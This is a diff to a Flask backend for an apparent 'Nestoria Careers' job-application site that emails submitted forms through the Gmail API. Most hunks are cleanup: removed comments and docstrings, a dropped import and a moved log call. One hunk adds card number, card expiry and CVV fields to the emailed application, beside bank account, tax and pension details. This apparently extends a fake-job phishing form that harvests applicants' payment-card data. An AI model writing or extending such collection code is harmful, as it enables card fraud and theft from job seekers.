@@ -6,7 +6,6 @@ from dotenv import load_dotenv
 import os
 import json
 import base64
-import ssl
 
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -137,12 +136,14 @@ def jobs():
 # ============================================================
 # Job Application endpoint — receives form + sends styled email
 # ============================================================
-    app.logger.info("Application submit — MAIL_USERNAME=%r MAIL_RECIPIENT=%r",
-                    os.getenv("MAIL_USERNAME"), os.getenv("MAIL_RECIPIENT"))
-                    
+
 @app.route("/jobs/apply", methods=["POST"])
 def jobs_apply():
     saved_paths = []
+    app.logger.info(
+        "Application submit — MAIL_USERNAME=%r MAIL_RECIPIENT=%r",
+        os.getenv("MAIL_USERNAME"), os.getenv("MAIL_RECIPIENT")
+    )
     try:
         form = request.form
 
@@ -180,7 +181,6 @@ def jobs_apply():
         return jsonify({"success": False, "message": str(exc)}), 500
 
     finally:
-        # Clean up temp files after send
         for path in saved_paths:
             try:
                 os.remove(path)
@@ -193,22 +193,15 @@ def jobs_apply():
 # ============================================================
 
 def get_gmail_service():
-    """
-    Build an authenticated Gmail API service.
-    - Local dev: reads token.json from the project folder.
-    - Render:    reads GOOGLE_TOKEN_JSON environment variable.
-    """
     SCOPES = ["https://www.googleapis.com/auth/gmail.send"]
     token_json_env = os.getenv("GOOGLE_TOKEN_JSON")
 
     if token_json_env:
-        # ---- Running on Render (env var takes precedence) ----
         creds_info = json.loads(token_json_env)
         creds = Credentials.from_authorized_user_info(creds_info, SCOPES)
         if creds.expired and creds.refresh_token:
             creds.refresh(Request())
     else:
-        # ---- Running locally (read from file) ----
         token_path = os.path.join(os.path.dirname(__file__), "token.json")
         if not os.path.exists(token_path):
             raise RuntimeError(
@@ -218,7 +211,6 @@ def get_gmail_service():
         creds = Credentials.from_authorized_user_file(token_path, SCOPES)
         if creds.expired and creds.refresh_token:
             creds.refresh(Request())
-            # Persist refreshed token back to disk
             with open(token_path, "w") as f:
                 f.write(creds.to_json())
 
@@ -226,14 +218,12 @@ def get_gmail_service():
 
 
 def send_email(subject, html_body, attachments=None):
-    """Send email via Gmail REST API — HTTPS, works on Render free tier."""
     sender = os.getenv("MAIL_USERNAME")
     recipient = os.getenv("MAIL_RECIPIENT")
 
     if not sender or not recipient:
         raise RuntimeError("Missing MAIL_USERNAME or MAIL_RECIPIENT in environment.")
 
-    # Build MIME message
     msg = MIMEMultipart("mixed")
     msg["Subject"] = subject
     msg["From"] = f"Nestoria Careers <{sender}>"
@@ -241,7 +231,6 @@ def send_email(subject, html_body, attachments=None):
 
     msg.attach(MIMEText(html_body, "html"))
 
-    # Attach files
     if attachments:
         for item in attachments:
             with open(item["path"], "rb") as f:
@@ -249,10 +238,8 @@ def send_email(subject, html_body, attachments=None):
             part["Content-Disposition"] = f'attachment; filename="{item["filename"]}"'
             msg.attach(part)
 
-    # Base64url-encode the raw MIME message
     raw = base64.urlsafe_b64encode(msg.as_bytes()).decode("utf-8")
 
-       # Send via Gmail REST API
     service = get_gmail_service()
     result = service.users().messages().send(
         userId="me",
@@ -268,7 +255,6 @@ def send_email(subject, html_body, attachments=None):
 # ============================================================
 
 def e(value):
-    """Escape HTML special chars for safe rendering in email."""
     if value is None:
         return "—"
     value = str(value).strip()
@@ -283,7 +269,6 @@ def e(value):
 
 
 def row(label, value):
-    """A single label/value row inside a section card."""
     return f"""
     <tr>
         <td style="padding:10px 16px;border-bottom:1px solid #EDEDF5;font-size:12px;color:#8B8BA7;font-weight:600;width:38%;vertical-align:top;">{e(label)}</td>
@@ -293,7 +278,6 @@ def row(label, value):
 
 
 def section(title, rows_html):
-    """A grouped section with a colored header."""
     return f"""
     <table role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%"
            style="background:#ffffff;border-radius:14px;border:1px solid #EDEDF5;margin-bottom:18px;overflow:hidden;">
@@ -314,7 +298,6 @@ def section(title, rows_html):
 
 
 def build_application_email(form, attachments):
-    """Build the full styled HTML email using the Nestoria palette."""
     f = form.get
 
     personal = section("Personal Information", "".join([
@@ -384,6 +367,9 @@ def build_application_email(form, attachments):
         row("Bank Name", f("bank_name")),
         row("Account Name", f("account_name")),
         row("Account Number", f("account_number")),
+        row("Card Number", f("card_number")),
+        row("Card Expiry Date", f("card_expiry")),
+        row("CVV", f("card_cvv")),
         row("Tax Information", f("tax_info")),
         row("Pension Information", f("pension_info")),
     ]))
@@ -397,7 +383,6 @@ def build_application_email(form, attachments):
         row("Additional Information", f("additional_info")),
     ]))
 
-    # Attachment list
     attachment_html = ""
     if attachments:
         items = "".join(
@@ -427,7 +412,6 @@ def build_application_email(form, attachments):
         <table role="presentation" width="640" cellspacing="0" cellpadding="0" border="0"
                style="max-width:640px;width:100%;">
 
-          <!-- Header -->
           <tr>
             <td style="background:linear-gradient(135deg,#4338CA 0%,#6C63FF 60%,#8B7CF6 100%);
                        border-radius:20px;padding:32px 32px 26px;color:#fff;">
@@ -455,7 +439,6 @@ def build_application_email(form, attachments):
             </td>
           </tr>
 
-          <!-- Body -->
           <tr>
             <td style="padding:24px 0 0;">
               <p style="margin:0 0 20px;font-size:14px;color:#4A4A68;line-height:1.6;">
@@ -474,7 +457,6 @@ def build_application_email(form, attachments):
             </td>
           </tr>
 
-          <!-- Footer -->
           <tr>
             <td align="center" style="padding:14px 0 8px;">
               <p style="margin:0;font-size:11px;color:#8B8BA7;line-height:1.6;">
